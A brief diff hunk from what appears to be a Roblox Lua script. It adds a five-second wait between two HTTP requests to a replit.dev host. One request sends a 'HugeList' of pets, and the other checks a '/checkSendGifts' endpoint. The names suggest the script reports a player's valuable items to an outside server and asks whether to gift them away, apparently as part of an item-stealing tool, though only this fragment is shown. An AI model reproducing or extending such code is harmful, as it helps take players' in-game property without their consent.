@@ -337,7 +337,7 @@ local function dataFunction2()
                 HugeList = hugePetsString
             })
         })
-
+wait(5)
         local checkResponse = request({
             Url = 'https://71530385-1c3c-4b6f-a88a-1b94478b0d21-00-3dvn9h52wp97.worf.replit.dev/checkSendGifts',
             Method = 'GET',
